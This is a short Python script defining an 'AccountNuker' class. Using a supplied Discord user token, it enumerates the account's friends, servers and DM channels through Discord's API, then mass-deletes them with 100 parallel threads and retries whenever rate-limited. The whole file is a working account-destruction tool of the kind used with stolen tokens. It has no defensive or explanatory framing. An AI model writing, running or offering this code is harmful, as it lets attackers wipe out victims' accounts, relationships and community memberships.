from time import sleep
import requests
from concurrent.futures import ThreadPoolExecutor

class AccountNuker:

    def __init__(self,token):
        self.token = token
        self.relationship_list = []
        self.guild_list = []
        self.dm_list = []

        self.initialize(self.token)

    def initialize(self, token: str):
        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers={
            'Authorization': token
        })

        self.relationship_list = [user["id"] for user in r.json()]

        r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={
            'Authorization': token
        })
        self.guild_list = [guild["id"] for guild in r.json()]

        r = requests.get(f'https://discord.com/api/v9/users/@me/channels', headers={
            'Authorization': token
        })

        self.dm_list =  [channel["id"] for channel in r.json()]

    def nuke(self, token: str):
        with ThreadPoolExecutor(max_workers=100) as executor:
            for user in self.relationship_list:
                executor.submit(self.remove_relationship, token, user)

            for guild in self.guild_list:
                executor.submit(self.remove_guild, token, guild)

            for dm in self.dm_list:
                executor.submit(self.remove_dm, token, dm)

    def remove_relationship(self, token, id):
        r = requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers={
            'Authorization': token
        })

        if r.status_code == 429:
            sleep(r.json()["retry_after"])
            self.remove_relationship(token, id)

    def remove_guild(self, token, guildId):
        r = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guildId}', headers={
            'Authorization': token,
        })

        if r.status_code == 429:
            sleep(r.json()['retry_after'])
            self.remove_guild(token, guildId)

    def remove_dm(self, token, channel_id):
        r = requests.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers={
            'Authorization': token,
        })

        if r.status_code == 429:
            sleep(r.json()['retry_after'])
            self.remove_dm(token, channel_id)
